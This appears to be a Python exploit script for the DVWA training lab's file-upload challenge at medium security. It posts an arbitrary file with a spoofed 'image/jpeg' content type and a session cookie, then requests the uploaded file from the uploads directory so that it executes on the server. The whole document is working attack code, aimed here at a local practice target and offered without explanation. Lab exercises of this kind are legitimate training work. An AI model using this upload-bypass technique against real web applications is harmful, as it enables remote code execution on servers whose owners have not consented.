import requests
import sys

file_name = sys.argv[1]

target = "http://localhost/DVWA/vulnerabilities/upload/"
exec_url = "http://localhost/DVWA/hackable/uploads/{}".format(file_name)
params = {"MAX_FILE_SIZE": "100000", "uploaded": file_name, "Upload": "Upload"}
payload = {"uploaded": (file_name,open(file_name,"r"),"image/jpeg")}
cookie = {"security": "medium", "PHPSESSID": "r7a512dpb410m6fjlc4neuige4"}

req1 = requests.post(url=target, data=params, files=payload, cookies=cookie)
req2 = requests.get(url=exec_url, cookies=cookie)
